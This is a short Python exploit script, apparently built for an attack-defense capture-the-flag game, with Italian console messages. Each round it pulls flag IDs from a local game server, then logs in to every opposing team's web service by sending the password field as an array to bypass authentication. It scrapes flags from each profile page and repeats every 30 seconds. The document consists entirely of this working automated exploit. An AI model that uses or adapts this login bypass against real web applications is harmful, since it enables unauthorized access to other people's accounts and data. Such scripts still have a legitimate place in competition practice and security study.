import requests,time,json,rstr,re;
from datetime import datetime;

ips = []
round_time = 30
flag_ids = {}

def get_flag_ids():
	request = requests.get(f"http://localhost:8081/flagIds")
	json = request.json()
	flag_ids = json['ilBonus']
	print(f"Flag_ids: \n {flag_ids}\n")
	return flag_ids
	
def login(ip, flag_id):
	r = requests.Session()
	email = flag_id
	password = "null"
	data = {"email": email, "password[]": password}
	r.post(f"http://{ip}:8000/login", data = data)
	return r


def attack(ip):
	newFlags = []
	for flag_id in flag_ids[ip]:
		session = login(ip,flag_id)
		profile_html = session.get(f"http://{ip}:8000/profilo").text
		flag = re.findall("[A-Z0-9]{31}=", profile_html)
		newFlags.extend(flag)
	if(len(newFlags) == 0):
		raise Exception()
	return newFlags

def main():
	round = 0
	while True :
		flags = []
		print(f"Inizio round {round} - {datetime.now().strftime('%H:%M:%S')}\n")
		for ip in ips:
		        newFlags = []
		        try:
		        	newFlags = attack(ip)
		        except Exception as e:
		        	print(f"-	Eccezione catturata: l'indirizzo {ip} si Ã¨ difeso\n")
		        	continue

		        print(f"-       Catturate {len(newFlags)} nuove flag dall'ip: {ip}\n{newFlags}\n")
		        flags.extend(newFlags)

		print(f"Fine round {round} - Catturate {len(flags)} flag totali - {datetime.now().strftime('%H:%M:%S')}\n")
		#submit(flags)
		round+=1
		time.sleep(round_time)
		
flag_ids = get_flag_ids()
ips = list(flag_ids.keys())

main()
